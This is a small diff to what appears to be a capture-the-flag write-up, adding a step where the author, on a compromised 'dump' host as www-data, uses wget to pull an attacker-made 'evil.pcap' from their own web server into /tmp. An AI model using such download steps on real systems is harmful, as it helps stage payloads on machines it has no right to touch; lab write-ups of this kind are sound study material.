@@ -329,6 +329,12 @@ Then ill use the script to create the pcap for me
 Then ill start a webserver on my machine and transfer the pcap to the target
 
 ```python
+www-data@dump:/tmp$ wget http://10.10.14.61/evil.pcap -o evil.pcap
+```
+
+Then ill grab the pcap file and place it in `/tmp`
+
+```python
 
 ```
 
